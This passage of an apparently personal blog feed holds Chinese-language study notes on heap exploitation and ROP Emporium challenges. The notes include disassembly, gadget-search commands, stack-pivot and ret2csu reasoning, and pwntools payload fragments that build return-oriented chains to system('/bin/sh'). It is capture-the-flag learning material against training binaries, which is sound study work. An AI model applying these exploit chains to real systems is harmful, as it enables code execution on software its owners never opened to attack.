    <summary type="html">&lt;h1 id=&quot;堆利用Heap-Exploitation&quot;&gt;&lt;a href=&quot;#堆利用Heap-Exploitation&quot; class=&quot;headerlink&quot; title=&quot;堆利用Heap Exploitation&quot;&gt;&lt;/a&gt;堆利用Heap Exploitation&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot;&gt;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&quot;&gt;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基础知识学习ptmalloc&lt;/p&gt;
&lt;h2 id=&quot;命令：：&quot;&gt;&lt;a href=&quot;#命令：：&quot; class=&quot;headerlink&quot; title=&quot;命令：：&quot;&gt;&lt;/a&gt;命令：：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;gef➤  x/32gx &amp;amp;main_arena &lt;/code&gt;&lt;br&gt;&lt;code&gt;gef➤  heap bins &lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Heap" scheme="http://finsenty54.github.io/categories/Heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium pivot + ret2csu</title>
    <link href="http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/"/>
    <id>http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/</id>
    <published>2021-03-02T08:49:03.000Z</published>
    <updated>2021-03-02T08:51:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><pre><code>objdump -T libpivot32.so 查看所有符号rabin2 -E ./libpivot.so 也可以查看 -E              globally exportable symbolsobjdump -j .text -d ./ret2csuobjdump -x ret2csugef➤  search-pattern 0x4004d0 查询含有0x4004d0 的地址</code></pre><a id="more"></a><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4">https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4</a></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><p>x86<br>函数参数在函数返回地址的上方<br>x64<br>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。<br>内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。</p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>stack pivot<br>To “stack pivot” just means to move the stack pointer elsewhere.</p><p>用命令可以发现<br>10   0x0000077d 0x0000077d GLOBAL FUNC   43       foothold_function<br>18   0x00000974 0x00000974 GLOBAL FUNC   164      ret2win<br>偏移量为1F7</p><p>stack smash<br>EBP-0X28<br>可以写入0x38<br>40+4 溢出到返回地址</p><p>0x080487b4      ff7508         push dword [arg_8h]<br>第一次写入的地方是指针，我看错了，以为直接写入arg_8h处，这里放第二段较长的ROP链</p><p>大体思路：先调用一次foothold，将got表项的内容加载进寄存器，而不是表项地址，加上ret2win的偏移，调用</p><h2 id="ret2rsu"><a href="#ret2rsu" class="headerlink" title="ret2rsu"></a>ret2rsu</h2><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>ret2win 的三个参数放在<br>│           ; arg uint32_t arg1 @ rdi<br>│           ; arg uint32_t arg2 @ rsi<br>│           ; arg uint32_t arg3 @ rdx</p><h3 id="查看-libc-csu-init代码"><a href="#查看-libc-csu-init代码" class="headerlink" title="查看__libc_csu_init代码"></a>查看__libc_csu_init代码</h3><p><code>objdump -j .text -d ./ret2csu</code></p><pre><code>0000000000400640 &lt;__libc_csu_init&gt;:  400640:    41 57                    push   %r15  400642:    41 56                    push   %r14  400644:    49 89 d7                 mov    %rdx,%r15  400647:    41 55                    push   %r13  400649:    41 54                    push   %r12  40064b:    4c 8d 25 9e 07 20 00     lea    0x20079e(%rip),%r12        # 600df0 &lt;__frame_dummy_init_array_entry&gt;  400652:    55                       push   %rbp  400653:    48 8d 2d 9e 07 20 00     lea    0x20079e(%rip),%rbp        # 600df8 &lt;__do_global_dtors_aux_fini_array_entry&gt;  40065a:    53                       push   %rbx  40065b:    41 89 fd                 mov    %edi,%r13d  40065e:    49 89 f6                 mov    %rsi,%r14  400661:    4c 29 e5                 sub    %r12,%rbp  400664:    48 83 ec 08              sub    $0x8,%rsp  400668:    48 c1 fd 03              sar    $0x3,%rbp  40066c:    e8 5f fe ff ff           callq  4004d0 &lt;_init&gt;  400671:    48 85 ed                 test   %rbp,%rbp  400674:    74 20                    je     400696 &lt;__libc_csu_init+0x56&gt;  400676:    31 db                    xor    %ebx,%ebx  400678:    0f 1f 84 00 00 00 00     nopl   0x0(%rax,%rax,1)  40067f:    00   400680:    4c 89 fa                 mov    %r15,%rdx  400683:    4c 89 f6                 mov    %r14,%rsi  400686:    44 89 ef                 mov    %r13d,%edi  400689:    41 ff 14 dc              callq  *(%r12,%rbx,8)  40068d:    48 83 c3 01              add    $0x1,%rbx  400691:    48 39 dd                 cmp    %rbx,%rbp  400694:    75 ea                    jne    400680 &lt;__libc_csu_init+0x40&gt;  400696:    48 83 c4 08              add    $0x8,%rsp  40069a:    5b                       pop    %rbx  40069b:    5d                       pop    %rbp  40069c:    41 5c                    pop    %r12  40069e:    41 5d                    pop    %r13  4006a0:    41 5e                    pop    %r14  4006a2:    41 5f                    pop    %r15  4006a4:    c3                       retq     4006a5:    90                       nop  4006a6:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)  4006ad:    00 00 00 </code></pre><p>直接用ROPgadget搜有些代码搜不到的</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>要使用ret2csu<br>就需要绕过call<br>这是[ ]指针，需要解引用，即调用函数</p><p><code>objdump -x ret2csu </code></p><pre><code> 10 .init         00000017  00000000004004d0  00000000004004d0  000004d0  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE 11 .plt          00000030  00000000004004f0  00000000004004f0  000004f0  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 12 .text         00000192  0000000000400520  0000000000400520  00000520  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 13 .fini         00000009  00000000004006b4  00000000004006b4  000006b4  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE</code></pre><p>可以看到一共有四块代码<br>选择.init</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/ret2csu]└──╼ $objdump -j .init -d ./ret2csu ./ret2csu:     file format elf64-x86-64Disassembly of section .init:00000000004004d0 &lt;_init&gt;:  4004d0:    48 83 ec 08              sub    $0x8,%rsp  4004d4:    48 8b 05 1d 0b 20 00     mov    0x200b1d(%rip),%rax        # 600ff8 &lt;__gmon_start__&gt;  4004db:    48 85 c0                 test   %rax,%rax  4004de:    74 02                    je     4004e2 &lt;_init+0x12&gt;  4004e0:    ff d0                    callq  *%rax  4004e2:    48 83 c4 08              add    $0x8,%rsp  4004e6:    c3                       retq   </code></pre><p>gdb-ref<br><code>gef➤  search-pattern 0x4004d0</code></p><pre><code>  0x600e38 - 0x600e44  →   &quot;\xd0\x04\x40[...]&quot; </code></pre><p>同时rbx=0 rbp=1</p><p>csu代码片段使用了两次</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码：&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;objdump -T libpivot32.so 查看所有符号
rabin2 -E ./libpivot.so 也可以查看
 -E              globally exportable symbols
objdump -j .text -d ./ret2csu
objdump -x ret2csu
gef➤  search-pattern 0x4004d0 查询含有0x4004d0 的地址&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium 第三到四题</title>
    <link href="http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/"/>
    <id>http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/</id>
    <published>2021-01-15T12:22:50.000Z</published>
    <updated>2021-01-15T12:24:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>ROP Emporium write4,badchars,fluff<br>write4和badchars都解出来了，fluff找不到有用的gadget<br>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><a id="more"></a><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>瞎搜找到的：<br><a href="https://github.com/abatchy17/ROP-Emporium">https://github.com/abatchy17/ROP-Emporium</a></p><ol><li>Get function names: <code>nm binary | grep &#39; t &#39;</code></li><li>Get GOT entries: <code>readelf --relocs binary</code></li><li>Get PLT entries: <code>objdump -M intel -dj .plt binary</code></li><li>Get strings: <code>strings</code> binary or the much better alternative <code>rabin2 -z binary</code></li><li>Virtual address space layout: <code>vmmap </code>in PEDA after starting program, otherwise other modules aren’t mapped yet.</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>当前指令地址<code>PC</code></p><pre><code>objdump -sobjdump -R objdump --section=.plt -d ./write432 //查看plt</code></pre><p>./write432:     file format elf32-i386</p><pre><code>Disassembly of section .plt:080483a0 &lt;.plt&gt;: 80483a0:    ff 35 04 a0 04 08        pushl  0x804a004 80483a6:    ff 25 08 a0 04 08        jmp    *0x804a008 80483ac:    00 00                    add    %al,(%eax)    ...080483b0 &lt;pwnme@plt&gt;: 80483b0:    ff 25 0c a0 04 08        jmp    *0x804a00c 80483b6:    68 00 00 00 00           push   $0x0 80483bb:    e9 e0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483c0 &lt;__libc_start_main@plt&gt;: 80483c0:    ff 25 10 a0 04 08        jmp    *0x804a010 80483c6:    68 08 00 00 00           push   $0x8 80483cb:    e9 d0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483d0 &lt;print_file@plt&gt;: 80483d0:    ff 25 14 a0 04 08        jmp    *0x804a014 80483d6:    68 10 00 00 00           push   $0x10 80483db:    e9 c0 ff ff ff           jmp    80483a0 &lt;.plt&gt;</code></pre><p><code>objdump -j .plt -d ./write432</code>命令效果一样</p><pre><code>ROPgadget --binary ./write432 --only &#39;mov|ret&#39;ROPgadget --binary ./write432 --only &#39;mov|ret&#39; | grep ebx</code></pre><p><strong>要点：</strong>print_file参数是一个地址，所以不能用字符串</p><pre><code>0x00001018    0x8 0x0804a018    0x8 -rw- .data</code></pre><p>我选择把字符串放到data段上。</p><pre><code>dataaddress=p32(0x0804a018)data1=b&#39;flag&#39;data2=b&#39;.txt&#39;</code></pre><p>第一次我数据没有分开，ebp只有32位，一次只能传4字节，我第一次竟然没有认识到</p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><pre><code>│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; &quot;nonexistent&quot;│           0x00400620      e8ebfeffff     call sym.imp.print_file</code></pre><p>参数传到RDI<br>    #0x0000000000400628 : mov qword ptr [r14], r15 ; ret<br>    #0x0000000000400690 : pop r14 ; pop r15 ; ret<br>    #0x0000000000400693 : pop rdi ; ret</p><pre><code>gadget=popret+dataaddress+data+movretgadget+=popret1+dataaddressgadget+=printfile</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h3><p> Badchars are the reason that encoders such as shikata-ga-nai exist.<br>这里，会将badchars替换为<code>0xeb</code></p><p><em>IDA永远的神</em><br>反编译</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><p><code>man 7 ascii</code><br>查看ascii表</p><p><code>ropper --file ./badchars32 -b 6167782e</code><br>ropper排除badchars是这样用的，ROPgadget也是一样的</p><p>gdb_peda: <code>查看溢出点</code></p><pre><code>gdb-peda$ pattern_create 100gdb-peda$ pattern_offset AFAAAFAA found at offset: 44</code></pre><p><code>pwndbg&gt; rop --grep xor -- --badbytes 6167782e --ropchain --nojop</code></p><h3 id="寄存器解析"><a href="#寄存器解析" class="headerlink" title="寄存器解析"></a>寄存器解析</h3><p>bl is the name of the low 8 bits (bits 7-0) in the ebx register. There is also bh which is the bits 15-8 of ebx, and bx is the low 16 bits (bits 15-0). There is no name for the higher 16 bits.</p><p>This applies to all of the registers eax, ebx, ecx and edx.<br>搞错了，bl不是ebp中，而是ebx<br><a href="https://blog.csdn.net/ww506772362/article/details/75530723">https://blog.csdn.net/ww506772362/article/details/75530723</a></p><p>疑问：<br>我第一次传xor 参数ebx 的时候是00 00 00 8a , 放在栈中是00 00 00 8a , pop ebx , 是倒取读入?<br>所以是8a 00 00 00</p><p>EBP: 0x41304141 (‘AA0A’)</p><h3 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h3><h3 id="r14b"><a href="#r14b" class="headerlink" title="r14b"></a>r14b</h3><p>r14 r14d r14w r14b<br>有个坑<br>x的位置刚好是2e会被替换</p><p><code>Failed to open file: flag.t\xebt</code></p><p>目前没有找到可以用的gadget</p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>同样没有有用的gadget<br>mov [e?x],<br>xchg  [ecx],dl<br>pext edx, ebx, eax</p><p>pext 解析<br><a href="https://blog.csdn.net/qq_43401808/article/details/86540472">https://blog.csdn.net/qq_43401808/article/details/86540472</a></p><p>这条命令能用，但是没有<code>pop eax</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ROP Emporium write4,badchars,fluff&lt;br&gt;write4和badchars都解出来了，fluff找不到有用的gadget&lt;br&gt;代码：&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium前三题</title>
    <link href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2021-01-11T06:27:27.000Z</published>
    <updated>2021-01-11T06:30:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>简单的ROP学习，没有开启PIE</p><h2 id="Bypassing-NX-bit-using-chained-return-to-libc"><a href="#Bypassing-NX-bit-using-chained-return-to-libc" class="headerlink" title="Bypassing NX bit using chained return-to-libc"></a>Bypassing NX bit using chained return-to-libc</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p><p>system address + exit address + system+args<br>exit相当于下一步地址，因为不是调用call, 不会压入下一步地址</p><a id="more"></a><p>chaining seteuid, system and exit</p><p>问题：<br>1 seteuid_arg should be<code> zero</code><br>2 place function argument of both libc functions，，， a function argument of one libc function and an address of another libc function which is obviously not possible</p><p>seteuid_addr + system_addr + <code>seteuid_addr / exit_addr </code>+ system_arg<br> seteuid_addr / exit_addr 这里冲突了，当然是可以舍弃exit的</p><p>解决问题2：<br><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a><br>ESP Lifting<br><code>Frame Faking</code></p><p>esp lifting technique binary should be compiled without frame pointer (-fomit-frame-pointer) support.</p><p>Frame Faking：</p><pre><code>用“leave ret” instruction 覆盖返回地址leave = mov esp,ebp ; pop ebpret = pop EIP</code></pre><p><a href="https://imgchr.com/i/sMz61K"><img src="https://s3.ax1x.com/2021/01/09/sMz61K.png" alt="sMz61K.png"></a></p><p>第一次执行leave;ret时，此时ebp已经是fake_ebp1的地址值，执行完leave后，esp是seteuid_addr的地址，ebp是fake_ebp2的地址值，执行ret后，将<code>seteuid_addr推向eip</code>，参数在ebp+0x4；之后同理，可以执行system()</p><p>解决问题1：<br>strcpy which copies a NULL byte into seteuid_arg’s stack location<br>using sprintf NULL byte is copied in to seteuid_arg’s stack location</p><p>ROP<br>system(“/bin/sh”)</p><p>push binsh_addr<br>call system</p><p>call system=<br>push eip+5<br>jmp system</p><p>所以栈中system地址要和参数隔四个字节，因为中间还要放返回地址</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></p><h3 id="ROP定义："><a href="#ROP定义：" class="headerlink" title="ROP定义："></a>ROP定义：</h3><p>utilizing <strong>small instruction sequences **available in either the binary or libraries linked to the application called **gadgets</strong></p><p>ROP gadgets are small instruction sequences <strong>ending with a “ret” instruction “c3”</strong>.</p><p>The ROP gadget has to end with a “ret” to enable us to perform multiple sequences. Hence it is called** return oriented.**<br>所以才叫return , gadget后面都跟着ret</p><h3 id="有用的gadget"><a href="#有用的gadget" class="headerlink" title="有用的gadget"></a>有用的gadget</h3><p>1- We search the binary for all “ret” (c3) byte.<br>2- We go backwards to see if the previous byte contains a valid instruction. We reverse to the maximum number of bytes that can make a valid instruction (20 bytes).<br>3- We then record all valid instruction sequences found in the binary or linked libraries.</p><h4 id="Loading-a-constant-into-register"><a href="#Loading-a-constant-into-register" class="headerlink" title="Loading a constant into register"></a>Loading a constant into register</h4><p>POP eax; ret;</p><p>栈;<br>Address of POP EAX/RET gadget<br>0xdeadbeef<br>Address of next gadget</p><h4 id="Loading-from-memory"><a href="#Loading-from-memory" class="headerlink" title="Loading from memory"></a>Loading from memory</h4><p>mov ecx,[eax]; ret</p><h4 id="Storing-into-memory"><a href="#Storing-into-memory" class="headerlink" title="Storing into memory"></a>Storing into memory</h4><p>Mov [eax],ecx; ret</p><h4 id="Arithmetic-operations"><a href="#Arithmetic-operations" class="headerlink" title="Arithmetic operations"></a>Arithmetic operations</h4><p>add eax,0x0b; ret<br>xor edx,edx;ret</p><h4 id="System-call"><a href="#System-call" class="headerlink" title="System call"></a>System call</h4><p>int 0x80; ret<br>call gs:[0x10]; ret</p><h4 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h4><p>what libs are linked to the binary<br>gdb:<br><code>info files</code></p><pre><code>ps -aux | grep rop2cat /proc/28119/maps</code></pre><p> system call number of execve() is “11” or “0xb”<br> linux system call numbers in “/usr/include/i386-linux-gnu/asm/unistd_32.h “<br>grep execve</p><p>it wont affect the command “/bin/sh” is as<br>“/bin//sh”.</p><p><code>ROPradget --strings </code></p><h2 id="学习ROP的练习平台ropemporium"><a href="#学习ROP的练习平台ropemporium" class="headerlink" title="学习ROP的练习平台ropemporium"></a>学习ROP的练习平台ropemporium</h2><p><a href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p><p>起手式命令；；</p><h3 id="Confirming-protections"><a href="#Confirming-protections" class="headerlink" title="Confirming protections"></a>Confirming protections</h3><pre><code>$ rabin2 -I &lt;binary&gt;$ pwn checksec &lt;binary&gt;</code></pre><h3 id="Function-names-符号表symbols"><a href="#Function-names-符号表symbols" class="headerlink" title="Function names 符号表symbols"></a>Function names 符号表symbols</h3><pre><code>$ rabin2 -i &lt;binary&gt;$ nm -u &lt;binary&gt;$ nm ret2win|grep &#39; t &#39;Listing just those functions written by the programmer is harder, a rough approximation could be:$ rabin2 -qs &lt;binary&gt; | grep -ve imp -e &#39; 0 &#39;-s              symbolsgrep-q              be quiet, just show fewer data-v, --invert-match        select non-matching lines-e, --regexp=PATTERNS     use PATTERNS for matching</code></pre><h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>查找程序中字符串</p><ol><li><p><code>strings -d ./ret2win32</code></p></li><li><p><code>$ rabin2 -z split</code><br>偏移地址都给出了</p></li><li><p><code>ROPgadget --bianry --strings &#39;/bin/sh&#39;</code></p></li></ol><p>dmesg [options]<br>Display or control the kernel ring buffer.<br>For a quick and dirty confirmation of how many bytes are needed to cause an overflow </p><h3 id="题目：："><a href="#题目：：" class="headerlink" title="题目：："></a>题目：：</h3><p><a href="https://blog.csdn.net/SmalOSnail/article/details/106619419">https://blog.csdn.net/SmalOSnail/article/details/106619419</a><br><a href="https://github.com/TaQini/rop_emporium/blob/master/tasks">https://github.com/TaQini/rop_emporium/blob/master/tasks</a><br>大佬代码</p><p><a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a><br>我的解题代码</p><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p><code>p.sendlineafter(&#39;&gt;&#39;,b&#39;A&#39;*40+p64(0x00400756))</code><br>不用考虑截断？？ pwntools自行解决，厉害👍</p><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>32位<br>    payload += p32(system) +b’a’*4+ p32(catflag)<br>中间应该再加四个字节，作为返回地址</p><p>64位下传参</p><pre><code>[0x00400742]&gt; pdf┌ 17: sym.usefulFunction ();│           0x00400742      55             push rbp│           0x00400743      4889e5         mov rbp, rsp│           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; &quot;/bin/ls&quot; ; const char *string│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)│           0x00400750      90             nop│           0x00400751      5d             pop rbp└           0x00400752      c3             ret</code></pre><p>字符串传到了 <code>$edi</code></p><p>所以要报字符串地址传到RDI中<br><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching">https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching</a><br><a href="https://trustfoundry.net/basic-rop-techniques-and-tricks/">https://trustfoundry.net/basic-rop-techniques-and-tricks/</a></p><h3 id="如何搜索gadget"><a href="#如何搜索gadget" class="headerlink" title="如何搜索gadget"></a>如何搜索gadget</h3><p><a href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a><br>五种工具，我用了radare2 和 ROPgadget</p><h4 id="radare2中"><a href="#radare2中" class="headerlink" title="radare2中"></a>radare2中</h4><pre><code>/R [?] — Search for ROP gadgets/R/ — Search for ROP gadgets with a regular expressions</code></pre><p>太暴力了</p><pre><code>[0x00400742]&gt; /R pop rdi  0x004007c3                 5f  pop rdi  0x004007c4                 c3  ret</code></pre><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><code>ROPgadget --binary   | grep</code></p><h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>32位</p><pre><code>ROPgadget --binary ./callme32 --only &#39;add esp&#39;callme1=p32(0x080484f0)callme2=p32(0x08048550)callme3=p32(0x080484e0)addpopret=p32(0x080484aa)#0x080484aa : add esp, 8 ; pop ebx ; retargs1=p32(0xdeadbeef)args2=p32(0xcafebabe)args3=p32(0xd00df00d)# rop1sgadget=addpopret+args1+args2+args3offset = 44payload = b&#39;A&#39;*offsetpayload += callme1+ gadget+  callme2+gadget+callme3+gadget</code></pre><p>64位<br>64位下传参</p><pre><code>│           0x0040091e      ba06000000     mov edx, 6│           0x00400923      be05000000     mov esi, 5│           0x00400928      bf04000000     mov edi, 4│           0x0040092d      e8eefdffff     call sym.imp.callme_one</code></pre><p>所以用<br>    #0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</p><h2 id="PLT-和-GOT-PLT"><a href="#PLT-和-GOT-PLT" class="headerlink" title="PLT 和 GOT.PLT"></a>PLT 和 GOT.PLT</h2><p> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a><br><code>函数和变量作为符号</code>被存在可执行文件中, 不同类型的符号又聚合在一起, 称为<code>符号表</code></p><p> <a href="https://ropemporium.com/guide.html#Appendix%20A">https://ropemporium.com/guide.html#Appendix%20A</a><br>how the PLT is used in <code>lazy binding</code>?<br>Lazy binding is a technique used by the dynamic linker<br>symbol lookups for function calls into shared objects are deferred until the first time a function is actually called.<br>对共享对象的函数调用的符号查找 只有当第一个函数真的调用时才查找<br>Two program sections are used to achieve this effect<br> the<code>procedure linkage table (.plt)</code>and part of the <code>global offset table (.got.plt).</code><br>Lazy binding may be disabled by setting the LD_BIND_NOW environment variable to a nonempty string or using the RTLD_NOW flag when calling dlopen().<br>The first time an external function is called it, <strong>must be resolved</strong>. After that, all calls to it will be passed straight through to the desired function<br><code>rabin2 -R    relocations</code></p><h3 id="plt-节"><a href="#plt-节" class="headerlink" title=".plt 节"></a>.plt 节</h3><p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>比如3 function stubs<br>take the form <code>jmp; push; jmp</code>;. Above the stubs a <code>push; jmp;</code></p><pre><code>► 0x8049030  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804c00c&gt; </code></pre><p>间接跳转</p><pre><code> pwndbg&gt; x/wx 0x804c00c 0x804c00c &lt;puts@got.plt&gt;:    0x08049036   0x8049036  &lt;puts@plt+6&gt;                push   0   0x804903b  &lt;puts@plt+11&gt;               jmp    0x8049020 &lt;0x8049020&gt;</code></pre><p>it turns out that because we haven’t called puts before<br><strong>还没有使用puts，跳转到got又跳回到下一命令</strong><br>最后回到<code>.plt</code>表开头<br>      0x8049020                              push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804c004&gt;<br>     ► 